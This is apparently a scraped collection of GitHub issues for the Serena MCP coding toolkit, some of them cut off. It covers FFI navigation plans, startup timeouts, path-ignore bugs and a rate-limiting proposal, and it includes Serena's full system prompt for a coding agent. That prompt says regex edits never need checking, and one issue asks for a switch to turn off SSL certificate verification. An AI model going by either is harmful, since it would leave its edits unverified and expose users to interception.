- Test repo: Rust lib with Python bindings
- **Demo**: Show ""Find References"" working across Rust/Python boundary

**Success Metric**: Find Python usage of `#[pyfunction]` symbols

### Milestone 2: Protocol Buffers (1-2 weeks)
**Why**: Code generation is common, language-agnostic

**Deliverables**:
- Detect `.proto` files as source of truth
- Track generated `*_pb2.py`, `*.pb.ts`, `*.pb.go` files
- Map proto symbols to generated code symbols
- **Demo**: Change proto field, find all affected code

**Success Metric**: Find usage across 3+ generated languages

### Milestone 3: WebAssembly (1-2 weeks)
**Why**: Growing ecosystem, clear FFI via wasm-bindgen

**Deliverables**:
- Detect `#[wasm_bindgen]` exports
- Track JavaScript/TypeScript imports from wasm modules
- Handle async wasm imports
- **Demo**: Rust→WASM→TypeScript full navigation

**Success Metric**: Bidirectional navigation Rust ↔ TypeScript

### Milestone 4: General FFI Framework (2-3 weeks)
**Why**: Extensible to any language pair

**Deliverables**:
- Plugin architecture for FFI pattern detection
- Configuration file for custom FFI patterns
- Documentation for adding new language pairs
- Community contribution guide

**Success Metric**: Third-party contributor adds new language pair

## Technical Challenges

### Challenge 1: Name Mangling
**Problem**: Rust `compute_embeddings` → Python `compute_embeddings` (snake_case preserved in PyO3)

**Solution**: Pattern-specific name mapping rules
```python
FFI_NAME_MAPPINGS = {
    (Language.RUST, Language.PYTHON, ""pyo3""): lambda name: name,  # PyO3 preserves
    (Language.RUST, Language.C, ""extern""): lambda name: name,     # C preserves
    (Language.CPP, Language.PYTHON, ""pybind11""): lambda name: to_snake_case(name),
}
```

### Challenge 2: Indirect Imports
**Problem**: 
```python
from my_lib import compute_embeddings  # Direct
from my_lib import *                   # Indirect - how to track?
```

**Solution**: Use Python LSP's symbol resolution for indirect imports

### Challenge 3: Module Boundaries
**Problem**: Rust crate name ≠ Python module name
```toml
# Cargo.toml
[lib]
name = ""my_rust_lib""
crate-type = [""cdylib""]

[package.metadata.maturin]
python-source = ""python""  # Python sees different structure
```

**Solution**: Parse `Cargo.toml`, `pyproject.toml` to map crate↔module

### Challenge 4: Performance
**Problem**: Scanning entire codebase for patterns on every query

**Solution**: 
- Index FFI symbols on project open (like language servers do)
- Watch files for changes, incrementally update index
- Cache pattern matches

## Why This is Revolutionary

**What Exists Today**:
- JetBrains: Multi-language support = multiple LSPs running
- VSCode: Same thing
- LSP Spec: `textDocument/references` is single-language only

**What Doesn't Exist**:
- ✅ Finding FFI usage across languages
- ✅ Code generation tracking
- ✅ WASM boundary navigation
- ✅ Protocol buffer impact analysis

**What We're Building**:
- First tool to **actually** solve cross-language code intelligence
- Not via ""magic AI"" - via **proper FFI boundary detection**
- Extensible framework for community to add language pairs

## Success Criteria

### Technical
- [ ] Find 95%+ of Python imports of Rust `#[pyfunction]` symbols
- [ ] Bidirectional navigation: Rust→Python, Python→Rust
- [ ] <500ms latency for cross-language queries
- [ ] Extensible plugin architecture for new languages

### Community
- [ ] 5+ GitHub stars on demo repo
- [ ] 2+ external contributors adding language pairs
- [ ] Blog post with 1000+ views explaining architecture
- [ ] Conference talk proposal accepted (PyCon, RustConf)

### Upstream Impact
- [ ] Maintainers acknowledge this solves real problem
- [ ] PR accepted or architecture adopted
- [ ] Influences LSP spec discussions

## Call for Contributors

**Skills Needed**:
- Python + Rust experience (for PyO3 use case)
- LSP protocol knowledge
- Regex / tree-sitter parsing
- Test-driven development

**Good First Issues** (will create):
- [ ] Add Go `//export` detection
- [ ] Implement name mangling for pybind11
- [ ] Add GraphQL schema tracking
- [ ] Write tutorial: ""Adding a new FFI pattern""

**Maintainer** (for now): @ketema

## References

**Prior Art** (incomplete solutions):
- [LSP Spec Issue #172](https://github.com/microsoft/language-server-protocol/issues/172) - Cross-file references (same language only)
- JetBrains ""Polyglot"" - just runs multiple analyzers, no cross-language linking
- VSCode multi-root workspaces - same limitation

**Inspiration**:
- PyO3 docs: https://pyo3.rs/
- wasm-bindgen guide: https://rustwasm.github.io/wasm-bindgen/
- Protocol Buffers: https://protobuf.dev/

**Related Issues**:
- #611 - Multi-language support (addresses same-repo, different languages)
- #703 - Robust LSPManager (infrastructure this builds on)

---

**License**: Same as Serena (TBD - check upstream)

**Status**: 💡 Proposal - Seeking Feedback & Contributors

**Discussion**: Please comment with:
- Use cases you'd find valuable
- Language pairs you need (Rust↔Python, Go↔C, etc.)
- Technical concerns or suggestions
- Interest in contributing

I created two folders with similar names in the same directory, such as cc and cc good, and then carried out tasks in the cc good folder. When using this mcp, it will search for the cc folder and then work directly in the cc folder. So that when the task is completed, the ""cc good"" folder has nothing but initialization files

With Codex, when created new conversation with `/new` serena may not close the old rust-analyzer. And when create new conversation many times. The rust-analyzer will ate all of available memories.

```
PID 5042: 1988.94 MB
PID 11566: 1810.93 MB
```

I'm not sure if this is a expected behavior about `a client session will start a separate instance of a Serena server`. But it  would be better to use ra-multiplex or persist/reuse rust-analyzer instance while create new conversation.

- add the plugin manually (```addSbtPlugin(""ch.epfl.scala"" % ""sbt-bloop"" % ""2.0.16"")```)
- run the following commands:
```
sbt -Dbloop.export-jar-classifiers=sources bloopInstall
sbt clean compile

- activated the project

- then tried it with the following prompt:
`using serena mcp, show me all references of ""field1"" data member of class ""Config"" under ""SomeApp"" object`

for the following example code:
```
object SomeApp {
    case class Config(field1:String)
}

But the mcp failed to find references to the symbol, but only with `search_for_pattern` operation.
it did tried to use  `find_symbol` & `find_referencing_symbols` first, did find the case class, but coudlnt find the references for the field.

Because #192 is not finished yet, or even when it's finished, we might have projects with a language that doesn't have an LSP yet, it's quite hard to navigate your way around running Serena without an LSP.

**Describe the solution you'd like**
A simple way of defining `language: null` to disable running LSP and disabling tools that depend on LSPs.

**Describe alternatives you've considered**
I considered setting `language` to a language that I don't use, but then an LSP would be running in the background for no reason. 

**Additional context**
Right now, setting `language` to null causes an exception, `'NoneType' object has no attribute 'lower'`. Disabling LSP dependent tools is already doable."

I have:

- [x] Read the readme and verified that the issue cannot be solved by adjusting configuration
- [x] Understood that Serena's dashboard can be disabled through the config
- [x] Understood that by default a client session will start a separate instance of a Serena server. 
- [x] Understood that for multi-agent setups, the SSE mode should be used.
- [x] Verified that non-project files are ignored using either gitignore or the corresponding setting in `.serena/project.yml`
- [x] Have looked for similar issues and discussions, including closed ones
- [x] Made sure it's an actual issue and not a question - those should be opened as discussion instead.

If you have encountered a real and new issue:

- [x] I performed `<uv invocation> serena project health-check`
- [x] I indexed the project as described in the readme (fails)
- [x] Added sufficient explanation of my setup: the MCP client, the OS, the programming language, any config adjustments or relevant project specifics
- [x] Explained how the issue arose, added instructions on how to reproduce it (if possible)
- [x] If the issue happens on an open source project, I have added the link (n/a)
- [x] Wrote a meaningful title and description

I'm working on my rust project in WSL2 Fedora and I noticed that claude code is providing errors when calling serena, I don't have vscode installed (and there doesn't seem to be any mention of having to install this in the installation guide) and am pretty sure that I have rust-analyzer installed, so why am I getting this error?

You are a professional coding agent concerned with one particular codebase. You have 
access to semantic coding tools on which you rely heavily for all your work, as well as collection of memory 
files containing general information about the codebase. You operate in a resource-efficient and intelligent manner, always
keeping in mind to not read or generate content that is not needed for the task at hand.

When reading code in order to answer a user question or task, you should try reading only the necessary code. 
Some tasks may require you to understand the architecture of large parts of the codebase, while for others,
it may be enough to read a small set of symbols or a single file.
Generally, you should avoid reading entire files unless it is absolutely necessary, instead relying on
intelligent step-by-step acquisition of information. However, if you already read a file, it does not make
sense to further analyse it with the symbolic tools (except for the `find_referencing_symbols` tool), 
as you already have the information.

I WILL BE SERIOUSLY UPSET IF YOU READ ENTIRE FILES WITHOUT NEED!

CONSIDER INSTEAD USING THE OVERVIEW TOOL AND SYMBOLIC TOOLS TO READ ONLY THE NECESSARY CODE FIRST!
I WILL BE EVEN MORE UPSET IF AFTER HAVING READ AN ENTIRE FILE YOU KEEP READING THE SAME CONTENT WITH THE SYMBOLIC TOOLS!
THE PURPOSE OF THE SYMBOLIC TOOLS IS TO HAVE TO READ LESS CODE, NOT READ THE SAME CONTENT MULTIPLE TIMES!


You can achieve the intelligent reading of code by using the symbolic tools for getting an overview of symbols and
the relations between them, and then only reading the bodies of symbols that are necessary to answer the question 
or complete the task. 
You can use the standard tools like list_dir, find_file and search_for_pattern if you need to.
When tools allow it, you pass the `relative_path` parameter to restrict the search to a specific file or directory.
For some tools, `relative_path` can only be a file path, so make sure to properly read the tool descriptions.

If you are unsure about a symbol's name or location (to the extent that substring_matching for the symbol name is not enough), you can use the `search_for_pattern` tool, which allows fast
and flexible search for patterns in the codebase.This way you can first find candidates for symbols or files,
and then proceed with the symbolic tools.



Symbols are identified by their `name_path and `relative_path`, see the description of the `find_symbol` tool for more details
on how the `name_path` matches symbols.
You can get information about available symbols by using the `get_symbols_overview` tool for finding top-level symbols in a file,
or by using `find_symbol` if you already know the symbol's name path. You generally try to read as little code as possible
while still solving your task, meaning you only read the bodies when you need to, and after you have found the symbol you want to edit.
For example, if you are working with python code and already know that you need to read the body of the constructor of the class Foo, you can directly
use `find_symbol` with the name path `Foo/__init__` and `include_body=True`. If you don't know yet which methods in `Foo` you need to read or edit,
you can use `find_symbol` with the name path `Foo`, `include_body=False` and `depth=1` to get all (top-level) methods of `Foo` before proceeding
to read the desired methods with `include_body=True`
You can understand relationships between symbols by using the `find_referencing_symbols` tool.



You generally have access to memories and it may be useful for you to read them, but also only if they help you
to answer the question or complete the task. You can infer which memories are relevant to the current task by reading
the memory names and descriptions.


The context and modes of operation are described below. From them you can infer how to interact with your user
and which tasks and kinds of interactions are expected of you.

Context description:
You are running in desktop app context where the tools give you access to the code base as well as some
access to the file system, if configured. You interact with the user through a chat interface that is separated
from the code base. As a consequence, if you are in interactive mode, your communication with the user should
involve high-level thinking and planning as well as some summarization of any code edits that you make.
For viewing the code edits the user will view them in a separate code editor window, and the back-and-forth
between the chat and the code editor should be minimized as well as facilitated by you.
If complex changes have been made, advise the user on how to review them in the code editor.
If complex relationships that the user asked for should be visualized or explained, consider creating
a diagram in addition to your text-based communication. Note that in the chat interface you have various rendering
options for text, html, and mermaid diagrams, as has been explained to you in your initial instructions.

Modes descriptions:

- You are operating in interactive mode. You should engage with the user throughout the task, asking for clarification
whenever anything is unclear, insufficiently specified, or ambiguous.

Break down complex tasks into smaller steps and explain your thinking at each stage. When you're uncertain about
a decision, present options to the user and ask for guidance rather than making assumptions.

Focus on providing informative results for intermediate steps so the user can follow along with your progress and
provide feedback as needed.

- You are operating in editing mode. You can edit files with the provided tools
to implement the requested changes to the code base while adhering to the project's code style and patterns.
Use symbolic editing tools whenever possible for precise code modifications.
If no editing task has yet been provided, wait for the user to provide one.

When writing new code, think about where it belongs best. Don't generate new files if you don't plan on actually
integrating them into the codebase, instead use the editing tools to insert the code directly into the existing files in that case.

You have two main approaches for editing code - editing by regex and editing by symbol.
The symbol-based approach is appropriate if you need to adjust an entire symbol, e.g. a method, a class, a function, etc.
But it is not appropriate if you need to adjust just a few lines of code within a symbol, for that you should
use the regex-based approach that is described below.

Let us first discuss the symbol-based approach.
Symbols are identified by their name path and relative file path, see the description of the `find_symbol` tool for more details
on how the `name_path` matches symbols.
You can get information about available symbols by using the `get_symbols_overview` tool for finding top-level symbols in a file,
or by using `find_symbol` if you already know the symbol's name path. You generally try to read as little code as possible
while still solving your task, meaning you only read the bodies when you need to, and after you have found the symbol you want to edit.
Before calling symbolic reading tools, you should have a basic understanding of the repository structure that you can get from memories
or by using the `list_dir` and `find_file` tools (or similar).
For example, if you are working with python code and already know that you need to read the body of the constructor of the class Foo, you can directly
use `find_symbol` with the name path `Foo/__init__` and `include_body=True`. If you don't know yet which methods in `Foo` you need to read or edit,
you can use `find_symbol` with the name path `Foo`, `include_body=False` and `depth=1` to get all (top-level) methods of `Foo` before proceeding
to read the desired methods with `include_body=True`.
In particular, keep in mind the description of the `replace_symbol_body` tool. If you want to add some new code at the end of the file, you should
use the `insert_after_symbol` tool with the last top-level symbol in the file. If you want to add an import, often a good strategy is to use
`insert_before_symbol` with the first top-level symbol in the file.
You can understand relationships between symbols by using the `find_referencing_symbols` tool. If not explicitly requested otherwise by a user,
you make sure that when you edit a symbol, it is either done in a backward-compatible way, or you find and adjust the references as needed.
The `find_referencing_symbols` tool will give you code snippets around the references, as well as symbolic information.
You will generally be able to use the info from the snippets and the regex-based approach to adjust the references as well.
You can assume that all symbol editing tools are reliable, so you don't need to verify the results if the tool returns without error.


Let us discuss the regex-based approach.
The regex-based approach is your primary tool for editing code whenever replacing or deleting a whole symbol would be a more expensive operation.
This is the case if you need to adjust just a few lines of code within a method, or a chunk that is much smaller than a whole symbol.
You use other tools to find the relevant content and
then use your knowledge of the codebase to write the regex, if you haven't collected enough information of this content yet.
You are extremely good at regex, so you never need to check whether the replacement produced the correct result.
In particular, you know what to escape and what not to escape, and you know how to use wildcards.
Also, the regex tool never adds any indentation (contrary to the symbolic editing tools), so you have to take care to add the correct indentation
when using it to insert code.
Moreover, the replacement tool will fail if it can't perform the desired replacement, and this is all the feedback you need.
Your overall goal for replacement operations is to use relatively short regexes, since I want you to minimize the number
of output tokens. For replacements of larger chunks of code, this means you intelligently make use of wildcards for the middle part 
and of characteristic snippets for the before/after parts that uniquely identify the chunk.

For small replacements, up to a single line, you follow the following rules:

  1. If the snippet to be replaced is likely to be unique within the file, you perform the replacement by directly using the escaped version of the 
     original.
  2. If the snippet is probably not unique, and you want to replace all occurrences, you use the `allow_multiple_occurrences` flag.
  3. If the snippet is not unique, and you want to replace a specific occurrence, you make use of the code surrounding the snippet
     to extend the regex with content before/after such that the regex will have exactly one match.
  4. You generally assume that a snippet is unique, knowing that the tool will return an error on multiple matches. You only read more file content
     (for crafvarting a more specific regex) if such a failure unexpectedly occurs. 

Examples:

1 Small replacement
You have read code like
  
  ```python
  ...
  x = linear(x)
  x = relu(x)
  return x
  ...
  ```

and you want to replace `x = relu(x)` with `x = gelu(x)`.
You first try `replace_regex()` with the regex `x = relu\(x\)` and the replacement `x = gelu(x)`.
If this fails due to multiple matches, you will try `(linear\(x\)\s*)x = relu\(x\)(\s*return)` with the replacement `\1x = gelu(x)\2`.

2 Larger replacement

You have read code like

```python
def my_func():
  ...
  # a comment before the snippet
  x = add_fifteen(x)
  # beginning of long section within my_func
  ....
  # end of long section
  call_subroutine(z)
  call_second_subroutine(z)
```
and you want to replace the code starting with `x = add_fifteen(x)` until (including) `call_subroutine(z)`, but not `call_second_subroutine(z)`.
Initially, you assume that the the beginning and end of the chunk uniquely determine it within the file.
Therefore, you perform the replacement by using the regex `x = add_fifteen\(x\)\s*.*?call_subroutine\(z\)`
and the replacement being the new code you want to insert.

If this fails due to multiple matches, you will try to extend the regex with the content before/after the snippet and match groups. 
The matching regex becomes:
`(before the snippet\s*)x = add_fifteen\(x\)\s*.*?call_subroutine\(z\)` 
and the replacement includes the group as (schematically):
`\1<new_code>`

Generally, I remind you that you rely on the regex tool with providing you the correct feedback, no need for more verification!

IMPORTANT: REMEMBER TO USE WILDCARDS WHEN APPROPRIATE! I WILL BE VERY UNHAPPY IF YOU WRITE LONG REGEXES WITHOUT USING WILDCARDS INSTEAD!

oraios/serena,3468681546,648,MCP client for `serena` fails to start in CodexCLI: request timed out,closed,2025-09-30T10:26:14Z,2025-10-03T19:04:42Z,[],Nuclear7515,"### Summary

Starting CodexCLI causes the MCP client for `serena` to time out after 60 s. Starting `serena` standalone prints: `MCP server lifetime setup complete`.

### Error

```
MCP client for `serena` failed to start: request timed out
```

### Configuration (`config.toml`)

```toml
[mcp_servers.serena]
command = ""/home/computer/.local/bin/uvx""
args = [""--from"", ""git+https://github.com/oraios/serena"", ""serena"", ""start-mcp-server"", ""--context"", ""codex""]
startup_timeout_sec = 60
```

### Expected behavior

CodexCLI connects to the `serena` MCP server and initializes the client without timing out.

### Actual behavior

CodexCLI exits with the timeout error after `startup_timeout_sec`. Running `serena` directly reports successful initialization.

### Steps to reproduce

1. Use the `config.toml` above.
2. Start CodexCLI.
3. Wait until the timeout occurs.

### Environment

* OS and version: Debian 13
* CodexCLI version: 0.42.0

- [x] Read the readme and verified that the issue cannot be solved by adjusting configuration
- [x] Understood that Serena's dashboard can be disabled through the config
- [x] Understood that by default a client session will start a separate instance of a Serena server. 
- [x] Understood that for multi-agent setups, the SSE mode should be used.
- [x] Verified that non-project files are ignored using either gitignore or the corresponding setting in `.serena/project.yml`
- [x] Have looked for similar issues and discussions, including closed ones
- [x] Made sure it's an actual issue and not a question - those should be opened as discussion instead.

When disabling web dashboard by command, the command should be `serena-mcp-server`, not `serena`.

```bash
uvx --from git+https://github.com/oraios/serena@69f16bd serena-mcp-server --enable-web-dashboard false start-mcp-server

I doubt whether it really should be. Why not just `serena`?

oraios/serena,3447375687,640,"SSE Mode /messages/?session_id=... Returns ""Invalid Content-Type header"" with Correct Headers Description",open,2025-09-24T02:55:01Z,2025-09-27T07:29:54Z,[],abokyoy,"[mcp_20250924-103932.txt](https://github.com/user-attachments/files/22505297/mcp_20250924-103932.txt)

When I am running Serena MCP server in SSE mode (--transport sse --port 9121), the /sse endpoint correctly returns a dynamic session_id (e.g., /messages/?session_id=2091628429e544b283d6fe06575bb05b). However, accessing /messages/?session_id=... consistently returns Invalid Content-Type header, even with correct headers (Accept: text/event-stream and Content-Type: text/event-stream).
Steps to Reproduce

Run Serena:uvx --from git+https://github.com/oraios/serena serena-mcp-server --transport sse --port 9121 --context ide-assistant --project E:\LLM\LectureLearnLoop --log-level DEBUG


Test /sse:curl -H ""Accept: text/event-stream"" http://localhost:9121/sse

Output: event: endpoint\ndata: /messages/?session_id=2091628429e544b283d6fe06575bb05b
Test /messages/ with session_id:curl -v -H ""Accept: text/event-stream"" -H ""Content-Type: text/event-stream"" http://localhost:9121/messages/?session_id=2091628429e544b283d6fe06575bb05b

Output: HTTP/1.1 400 Bad Request\nInvalid Content-Type header

Expected Behavior
The /messages/?session_id=... endpoint should return SSE stream data (e.g., tool list or MCP messages) when provided with correct headers.
Actual Behavior
Returns Invalid Content-Type header regardless of headers used.
Environment

OS: Windows
Serena Version: 0.1.4-ec050699-dirty (via uvx)

The README mentions the ""prepare_for_new_conversation"" tool which is explicitly described as being useful when running out of context:

> Serena has a dedicated tool to create a summary of the current stat of the progress and all relevant info for continuing it. You can request to create this summary and write it to a memory. Then, in a new conversation, you can just ask Serena to read the memory and continue with the task.

I noticed however that in the ide-assistant context this particular tool is excluded so it is not available when running serena in Claude Code using the command recommended in the README, which explicilty says to use `--context ide-assistant`:

https://github.com/oraios/serena/blob/271e7ad31f40a744eb685320b235d28cd6cccaac/src/serena/resources/config/contexts/ide-assistant.yml#L19-L24

Why was it excluded exactly? I believe this is useful feature to have when using Serena in claude code..

But I'm sure I'm probably missing something important here, so apologies in advance if the questions sounds stupid. Thank you!"

These tools fundamentally function correctly with the existing coding agent tool, and I wish to avoid registering them as MCP tools to coding agent tool.

the configuration file like the below. list_dir, check_onboarding_performed work but for create_text_file and execute_shell_command, serena throws error and fails to start.
```yaml
excluded_tools:
  - ""list_dir""
  - ""create_text_file""
  - ""check_onboarding_performed""
  - ""execute_shell_command""

- [x] Have looked for similar issues and discussions, including closed ones
- [x] Made sure it's an actual issue and not a question - those should be opened as discussion instead

### Troubleshooting

- [x ] I performed `<uv invocation> serena project health-check`
- [x ] I indexed the project as described in the readme
- [x] Added sufficient explanation of my setup: the MCP client, the OS, the programming language, any config adjustments or relevant project specifics
- [x] Explained how the issue arose, added instructions on how to reproduce it (if possible)
- [ ] If the issue happens on an open source project, I have added the link
- [x] Wrote a meaningful title and description

### Environment

- **Operating System**: Linux
- **Programming Language**: Go (go1.23.4 linux/amd64)
- **Project Type**: GoMod project
- **Package Count**: Approximately 518 packages

```

### Issue Details

1. **Repeated Package Loading**: LSP repeatedly executes `go/packages.Load` operations in short intervals (#1044, #1045, #1046...)
2. **Repeated View Creation**: Continuously creates new view instances (#996, #997, #998...)
3. **MCP Tool Failure**: Code search and other MCP tools fail to work due to timeouts

### Steps to Reproduce

1. Open a Go project containing a large number of packages
2. Start Serena MCP service
3. Attempt to use code search tools
4. Observe log output, you will see continuous ""Created View"" messages

### Expected Behavior

- LSP should initialize only once
- MCP tools should respond normally
- Logs should not infinitely refresh with repeated content"

I am attempting to run Serena as an MCP for Codex CLI using these instructions:
https://github.com/oraios/serena?tab=readme-ov-file#codex

I have edited the config.toml. I have ""activated"" Serena. Attempting to access the Dashboard does not work. 

Environment:
I have tried multiple Windows environments via both Powershell and WSL (Ubuntu 24.04). For WSL, Claude Code works fine with Serena. 

I am able to run the following command (from powershell and WSL):
uvx --from git+https://github.com/oraios/serena serena start-mcp-server

And the dashboard reports the following:
[MainThread] serena.mcp:server_lifespan:347 - MCP server lifetime setup complete

But when I follow the directions here:
https://github.com/oraios/serena?tab=readme-ov-file#codex

I get the following message in Codex CLI:
MCP client for `serena` failed to start: request timed out

Additionally, codex-tui.log contains only the following:

## Issue Description

Complex gitignore-style patterns with negation (`!`) in `ignored_paths` configuration don't work as expected.

## Configuration Used

```yaml
ignored_paths:
  - ""!/src""
  - ""/src/*"" 
  - ""!/src/core""
  - ""/src/core/*""
  - ""!/src/core/main""
```

**Expected**: Should ignore everything in `/src/*` except `/src/core`, and ignore everything in `/src/core/*` except `/src/core/main`

**Actual**: Negation patterns are ignored, directories that should be included are still excluded

## Root Cause

In `SolidLanguageServer.is_ignored_path()`, the method returns `True` immediately from earlier checks, bypassing the pathspec negation logic:

```python
# Early returns prevent pathspec negation from working
if self.is_ignored_dirname(part):
    return True  # ❌ Skips pathspec matching

return match_path(...)  # ❌ Never reached for negated paths
```

## Suggested Fix

Move pathspec matching to the beginning of `is_ignored_path()` method to prioritize negation patterns:

```python
def is_ignored_path(self, relative_path: str, ignore_unsupported_files: bool = True) -> bool:
    # Check pathspec first (handles negation properly)
    pathspec_result = match_path(relative_path, self.get_ignore_spec(), root_path=self.repository_root_path)
    
    # If pathspec says ""don't ignore"" (negation), respect it
    if not pathspec_result:
        return False
        
    # Then apply other filters...
```

## Environment

- OS: Linux
- Programming Language: Python 3.12
- No special config adjustments beyond the ignored_paths pattern above"

## Problem Description
This issue is identified using **CodeQL**. When any parameter of a function is set default to None, it is inappropriate to re-define it in the function body with a short-circuit evaluation like `lst = lst or []` because this will change any **falsy** value passed to the function for this parameter into another value and continue without raising errors if it is actually given a ""falsy"" value of incorrect types. This could lead to bugs that are very hard to detect. This happens especially when the actual default value of the parameter is mutable, and the programmer is trying to avoid this error.

## Problem Locations
1. In file `test/conftest.py`, this problem occurs on the `ignored_paths` parameter of `create_ls` function:
```
def create_ls(
    language: Language,
    repo_path: str | None = None,
    ignored_paths: list[str] | None = None,
    trace_lsp_communication: bool = False,
    log_level: int = logging.ERROR,
) -> SolidLanguageServer:
    ignored_paths = ignored_paths or []
    if repo_path is None:
        repo_path = str(get_repo_path(language))
    gitignore_parser = GitignoreParser(str(repo_path))
    for spec in gitignore_parser.get_ignore_specs():
        ignored_paths.extend(spec.patterns)
    config = LanguageServerConfig(code_language=language, ignored_paths=ignored_paths, trace_lsp_communication=trace_lsp_communication)
    logger = LanguageServerLogger(log_level=log_level)
    return SolidLanguageServer.create(
        config,
        logger,
        repo_path,
        solidlsp_settings=SolidLSPSettings(solidlsp_dir=SERENA_MANAGED_DIR_IN_HOME, project_data_relative_path=SERENA_MANAGED_DIR_NAME),
    )
```
2. In file `src/serena/config/serena_config.py`, this problem occurs on the `project_name` parameter of `autogenerate` method:

                dominant_language = max(language_composition.keys(), key=lambda lang: language_composition[lang])
            else:
                dominant_language = project_language.value
            config_with_comments = load_yaml(PROJECT_TEMPLATE_FILE, preserve_comments=True)
            config_with_comments[""project_name""] = project_name

            return cls._from_dict(config_with_comments)
```

## Workaround
One easy and effective workaround is to replace statements like:
```
lst = lst or []
```
to statements like:
```
if lst is None:
    lst = []
```

Specifically, in this repo, we could change the `create_ls` function to:
```
def create_ls(
    language: Language,
    repo_path: str | None = None,
    ignored_paths: list[str] | None = None,
    trace_lsp_communication: bool = False,
    log_level: int = logging.ERROR,
) -> SolidLanguageServer:
    if ignored_paths is None:
        ignored_paths = []
    if repo_path is None:
        repo_path = str(get_repo_path(language))
    gitignore_parser = GitignoreParser(str(repo_path))
    for spec in gitignore_parser.get_ignore_specs():
        ignored_paths.extend(spec.patterns)
    config = LanguageServerConfig(code_language=language, ignored_paths=ignored_paths, trace_lsp_communication=trace_lsp_communication)
    logger = LanguageServerLogger(log_level=log_level)
    return SolidLanguageServer.create(
        config,
        logger,
        repo_path,
        solidlsp_settings=SolidLSPSettings(solidlsp_dir=SERENA_MANAGED_DIR_IN_HOME, project_data_relative_path=SERENA_MANAGED_DIR_NAME),
    )
```
and the `autogenerate` method to:
```
@classmethod
    def autogenerate(
        cls, project_root: str | Path, project_name: str | None = None, project_language: Language | None = None, save_to_disk: bool = True

oraios/serena,3375725692,588,"Bug: JSON-RPC data concatenated to filename, creating corrupted file in project root",open,2025-09-02T12:02:55Z,2025-09-04T09:01:27Z,[],TheJACKedViking,"# Bug Report: Corrupted Filename with JSON-RPC Data

## Description
Serena plugin created a PNG file with JSON-RPC protocol data concatenated to the filename, resulting in a file being created in the project root directory instead of the `.serena/` folder.

## Environment
- **Serena Version**: (check in VSCode/Claude Code extension panel)
- **Claude Code Version**: 1.0.88
- **Operating System**: Synology DSM (Linux 4.4.302+)
- **Date Occurred**: September 1, 2025 at 21:08

## Bug Details

### Expected Behavior
- Log files should be created inside `.serena/` directory
- Filenames should not contain protocol communication data
- JSON-RPC messages should be processed as data, not filenames

### Actual Behavior
A file was created with this corrupted filename:
```
serena-logs.png"":""initialize"",""params"":{""protocolVersion"":""2025-06-18"",""capabilities"":{""roots"":{}},""clientInfo"":{""name"":""claude-code"",""version"":""1.0.88""}},""jsonrpc"":""2.0"",""id"":0}
```

### File Information
- **File Type**: Valid PNG image data, 217 x 80, 8-bit/color RGBA, non-interlaced
- **File Size**: 14KB
- **Location**: Project root directory (not in `.serena/`)
- **Created**: September 1, 2025 at 21:08

## Impact
1. Creates files with extremely long, invalid filenames in project root
2. JSON-RPC protocol messages are not properly processed
3. May cause filesystem issues on certain operating systems
4. Pollutes project directory with files outside of `.serena/` folder

## Reproduction Steps
Unable to determine exact reproduction steps, but appears to occur during:
1. Serena plugin initialization
2. When Claude Code v1.0.88 attempts to establish protocol connection
3. During log file creation process

## Possible Root Cause
It appears that during file write operations, the JSON-RPC initialization message is being concatenated to the intended filename (`serena-logs.png`) instead of being handled as protocol communication data.

## Suggested Fix
1. Ensure proper separation between filename and data payload
2. Validate file paths before writing
3. Ensure all Serena-created files are contained within `.serena/` directory
4. Add filename sanitization to prevent protocol data from becoming part of filenames

## Workaround
Manually delete the corrupted file from the project root directory.

## Additional Context
The `.serena/` directory structure exists and contains:
- cache/
- memories/
- .gitignore
- project.yml

The bug appears to be related to improper handling of the file write operation where protocol data is mixed with the filename."

oraios/serena,3372419196,585,Feature Request: Add SSL verification bypass option for corporate proxy environments,closed,2025-09-01T12:04:32Z,2025-09-03T19:22:31Z,[],2hyjun,"**Is your feature request related to a problem? Please describe.**
When trying to use Serena MCP behind a corporate proxy with SSL/TLS inspection, the tool fails with SSL certificate verification errors because corporate proxies replace GitHub's certificates with their own, which Python's requests library doesn't trust by default.

The error message:
```
SSLError(SSLCertVerificationError(1, ""[SSL: CERTIFICATE_VERIFY_FAILED]
  certificate verify failed: unable to get local issuer certificate""))
```

This completely blocks Serena from downloading required language servers (Java, Kotlin) in enterprise environments.

**Describe the solution you'd like**
 Add an optional configuration parameter to disable SSL verification when setting up Serena MCP server:

```json
{
  ""mcpServers"": {
    ""serena"": {
      ""command"": ""uv"",
      ""args"": [""--directory"", ""/path/to/serena"", ""run"", ""serena""],
      ""env"": {
        ""SERENA_VERIFY_SSL"": ""false""
      }
    }
  }
}
```

Or as **a command-line argument: uv run serena --no-verify-ssl**

This would allow the requests.get() calls in solidlsp/ls_utils.py to bypass SSL verification when explicitly configured by the user.

**Describe alternatives you've considered**
  1. Manual file modification (current workaround): Finding all ls_utils.py files in ~/.cache/uv/ and adding verify=False to requests.get() calls. This is tedious and needs to be repeated after cache clearing.
  2. Manual file download: Downloading required files through browser and placing them in ~/.serena/language_servers/static/. This bypasses the automatic setup process."

* Are the permissions and their scopes correct?
* Are any permissions missing?
* Do any permissions need to be runtime-scoped (e.g., a specific project directory) rather than global?

**Proposed manifest (please review)**

I was doing a lot of component restructuring the other night and I ended up having to disable Serena because this issue was seriously corrupting files, and it tool Claude quite a bit to unravel a couple of the errors.  Suggestions?

Because it always goes in fail using with Claude Code.

oraios/serena,3361457685,564,[SCALABILITY] API Rate Limiting and Throttling System,closed,2025-08-28T01:55:12Z,2025-08-28T08:20:00Z,[],bstewart2255,"## 🚨 Priority: HIGH
**Impact**: Single user can overwhelm the system with rapid requests

## Problem Description
The application has no rate limiting, allowing abuse and resource exhaustion:

1. **No request throttling** on API endpoints
2. **AI generation endpoints** can be spammed (1643$)
3. **No user-based quotas** for expensive operations
4. **Database queries** unlimited per second
5. **No DDoS protection** mechanisms

## Current Vulnerabilities
- Single user can make 1000+ requests/second
- AI costs can spiral out of control
- Database can be overwhelmed by rapid queries
- No protection against malicious actors
- No usage tracking or billing limits

## Required Rate Limiting System

### 1. Rate Limiter Implementation
```typescript
// lib/rate-limiting/rate-limiter.ts
import { RateLimiterRedis, RateLimiterRes } from 'rate-limiter-flexible';
import Redis from 'ioredis';

class RateLimitManager {
  private limiters: Map<string, RateLimiterRedis> = new Map();
  private redis: Redis;
  
  constructor() {
    this.redis = new Redis({
      host: process.env.REDIS_HOST,
      port: process.env.REDIS_PORT,
      enableOfflineQueue: false,
    });
    
    this.initializeLimiters();
  }
  
  private initializeLimiters() {
    // General API rate limit
    this.limiters.set('api', new RateLimiterRedis({
      storeClient: this.redis,
      keyPrefix: 'rl:api',
